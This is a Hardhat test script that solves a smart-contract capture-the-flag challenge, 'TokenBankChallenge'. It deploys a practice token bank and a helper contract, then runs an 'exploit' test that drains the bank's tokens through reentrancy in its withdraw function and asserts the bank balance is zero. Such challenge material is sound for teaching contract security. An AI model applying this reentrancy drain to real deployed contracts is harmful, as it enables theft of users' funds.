import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { getAddress } from 'ethers/lib/utils';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let helper: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory, helperFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
      ethers.getContractFactory('TokenBankHelper', deployer),
    ]);

    target = await targetFactory.deploy(attacker.address);
    await target.deployed();

    const tokenAddress = await target.token();
    token = await tokenFactory.attach(tokenAddress);
    await token.deployed();

    // Deploy the helper contract
    helper = await helperFactory.deploy(target.address);
    await helper.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);
    helper = helper.connect(attacker);
  });

  it('exploit', async () => {

    //Withdraw tokens from user.
    await target.withdraw(utils.parseEther('500000'));

    //Send tokens to attack contract
    await token.transfer(helper.address, utils.parseEther('500000'));

    //Send tokens back to bank
    await helper.transferToTokenBank(token.address, target.address);

    //Attack withdraw function with reentrancy.
    await helper.attack();

    expect(await token.balanceOf(target.address)).to.equal(0);
    expect(await token.balanceOf(attacker.address)).to.equal(
      utils.parseEther('1000000')
    );
  });
});
